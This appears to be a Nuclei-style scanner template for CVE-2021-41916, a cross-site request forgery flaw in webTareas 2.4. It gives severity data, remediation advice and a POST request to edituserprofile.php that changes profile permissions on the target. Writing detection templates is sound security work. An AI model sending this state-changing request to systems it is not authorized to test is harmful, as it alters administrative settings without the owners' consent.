id: CVE-2021-41916

info:
  name: CSRF Vulnerability in webTareas 2.4
  author: ProjectDiscoveryAI
  severity: high
  description: A Cross-Site Request Forgery (CSRF) vulnerability in webTareas version 2.4 and earlier allows a remote attacker to create a new administrative profile and add a new user to the new profile without the victim's knowledge, by enticing an authenticated admin user to visit an attacker's web page.
  impact: |
    Successful exploitation could lead to unauthorized actions being performed by attackers on behalf of authenticated users.
  remediation: |
    Implement CSRF tokens and ensure proper validation of requests to prevent CSRF attacks.
  classification:
    cvss-metrics: CVSS:3.1/AV:N/AC:L/PR:N/UI:R/S:U/C:H/I:H/A:H
    cvss-score: 8.8
    cve-id: CVE-2021-41916
    cwe-id: CWE-352
    epss-score: 0.00168
    epss-percentile: 0.54735
    cpe: cpe:2.3:a:webtareas_project:webtareas:*:*:*:*:*:*:*:*
  metadata:
    vendor: webtareas_project
    product: webtareas

http:
  - method: POST
    path:
      - "{{BaseURL}}/edituserprofile.php"

    body: |
      vals[89]=Y&vals[91]=Y&vals[92]=Y&submit=Submit

    headers:
      Content-Type: application/x-www-form-urlencoded
    matchers:
      - type: word
        words:
          - "Profile updated successfully"
        part: body
